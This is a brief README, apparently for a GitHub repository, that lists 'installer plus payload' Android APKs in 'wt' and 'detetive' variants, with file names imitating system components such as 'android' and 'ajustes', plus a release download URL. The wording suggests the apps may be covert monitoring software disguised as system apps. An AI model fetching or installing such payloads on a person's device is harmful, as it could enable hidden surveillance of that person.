# apps

APK distribution. Downloads are published as [release assets](../../releases).

## apk1

Installer plus payload APKs, in `_wt` and `_detetive` variants:

- `instalador_wt.apk` · `instalador_detetive.apk`
- `android_wt.apk` · `android_detetive.apk`
- `ajustes_wt.apk` · `ajustes_detetive.apk`
- `atts_wt.apk` · `atts_detetive.apk`
- `arquivos_wt.apk` · `arquivos_detetive.apk`

Download:

```
https://github.com/wts-apps/apps/releases/download/apk1/<asset>
```
